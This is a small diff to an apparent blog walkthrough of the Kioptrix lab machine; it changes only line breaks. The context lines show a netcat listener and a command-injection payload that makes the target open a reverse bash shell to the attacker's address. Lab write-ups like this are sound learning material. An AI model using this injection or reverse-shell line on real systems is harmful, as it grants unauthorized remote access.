@@ -75,7 +75,7 @@ First we need to work out the location to put netcat on the Kioptrix machine. Fo
 In Terminal, we get netcat listening with <br>{% highlight ruby %}nc -lvp 1111{% endhighlight %}<br>I used port 1111, you can use whatever port you wish. 
 <br>
 Then back in the webapp textbox we need to input<br>{% highlight ruby %}; /usr/local/bin/nc 192.168.1.5 -e '/bin/bash' 1111{% endhighlight %}
-<br><br><br>
+<br>
 Now we've got a netcat connection going! Let's get some more information about the kernel. A quick {% highlight ruby %}uname -a{% endhighlight %} shows us this:
 <br><br>
 ![uname](/assets/kernel.PNG){: .center-image }
